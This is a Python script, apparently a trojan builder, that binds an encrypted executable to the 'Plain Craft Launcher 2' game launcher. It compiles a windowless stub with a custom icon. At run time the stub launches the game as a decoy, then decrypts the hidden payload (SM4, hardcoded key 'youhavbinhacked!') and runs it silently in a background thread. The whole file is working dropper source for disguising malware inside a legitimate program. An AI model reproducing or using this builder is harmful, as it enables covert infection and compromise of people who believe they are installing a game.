#######################################
import os
import subprocess
from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT
#######################################
#gamefile_path=input('gamefile_path:')
#clientfile_path=input('clientfile_path:')
#ico_path=input('ico_path:')
#cus_path=input('cus_path:')
gamefile_path='Plain Craft Launcher 2.exe'
clientfile_path='0.5client.exe'
ico_path='ico.ico'
cus_path=''

gamefile_size=os.path.getsize(gamefile_path)
#######################################
crypt_sm4=CryptSM4()
secret_key='youhavbinhacked!'.encode()
#######################################
def SM4_encrypt(plaintext,secret_key=secret_key,crypt_sm4=crypt_sm4):
    #encode
    #plaintext=plaintext.encode()
    #加密
    crypt_sm4.set_key(secret_key, SM4_ENCRYPT)
    ciphertext = crypt_sm4.crypt_ecb(plaintext)
    #返回
    return ciphertext
def encrypt_file(path):
    file=open(path,'rb')
    data=file.read()
    file.close()
    data_enc=SM4_encrypt(data)
    file2=open('fileout_enc','wb')
    file2.write(data_enc)
    file2.close()
#######################################
#第一步被优化掉了
#第二步，编译main
def step2():
    size_old=0
    size_new=1
    while  size_old<size_new:
        size_old=size_new#此时两个值一样大
        data=f'''
import subprocess
import threading
import os
import sys
from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT
####################################################
self_size={size_old}
game_size={gamefile_size} 
cus_path=''#自定义路径
#
crypt_sm4=CryptSM4()
secret_key='youhavbinhacked!'.encode()
#######################################
def SM4_decrypt(ciphertext,secret_key=secret_key,crypt_sm4=crypt_sm4):
    #解密
    crypt_sm4.set_key(secret_key, SM4_DECRYPT)
    decrypted_text = crypt_sm4.crypt_ecb(ciphertext)
    #返回
    return decrypted_text
####################################################
def decrypt_file(path,out):
    file=open(path,'rb')
    data=file.read()
    file.close()
    data_enc=SM4_decrypt(data)
    file2=open(out,'wb')
    file2.write(data_enc)
    file2.close()
def thread_(path):
    subprocess.call(path)
    os.remove(path)
    return 0
####################################################
#第一步，获取自身的位置
def get_self_name():
    self_path=os.path.abspath(sys.argv[0])
    return self_path
#第二步，分离程序
def get_separate(self_path):
    fself=open(self_path,'rb')
    data=fself.read()
    fself.close()
    fgame=open(cus_path+'gamedata','wb')
    fgame.write(data[self_size:self_size+game_size])
    fgame.close()
    fscript=open(cus_path+'encdata','wb')
    fscript.write(data[self_size+game_size:])
    fscript.close()
    #此时获得两个二进制文件
    return 1
#第三步，运行游戏程序
def start_game():
    thread1 = threading.Thread(target=thread_,args=(cus_path+'gamedata',))
    thread1.start()
#第四步，解密脚本程序
def get_C():
    path=cus_path+'encdata'
    out=cus_path+'scriptdata'
    decrypt_file(path,out)
#第五步，运行脚本程序
def start_script():
    thread2 = threading.Thread(target=thread_,args=(cus_path+'scriptdata',))
    thread2.start()

####################################################
#运行区域
self_path=get_self_name()
get_separate(self_path)
start_game()
get_C()
start_script()
'''
        #编写脚本
        f=open('temp.py','w',encoding='utf-8')
        f.write(data)
        f.close()
        #编译脚本
        subprocess.call(f'pyinstaller -F -w -i {ico_path} temp.py')
        size_new=os.path.getsize('./dist/temp.exe')
    #此时size_old>size_new，也就是预留空间比实际空间大一些
    #填充字节
    delta=size_old-size_new
    f=open('./dist/temp.exe','ab')
    for i in range(delta):
        f.write(b'\x00')
    f.close()
#第三步，加密脚本文件
def step3():
    encrypt_file(clientfile_path)#fileout_enc
#第四步，合并三文件
def step4():
    fmain=open('./dist/temp.exe','ab')
    fgame=open(gamefile_path,'rb')
    fscript=open('fileout_enc','rb')
    game=fgame.read()
    script=fscript.read()
    fgame.close()
    fscript.close()
    fmain.write(game)
    fmain.write(script)
    fmain.close()
#######################################
step2()
step3()
step4()

        
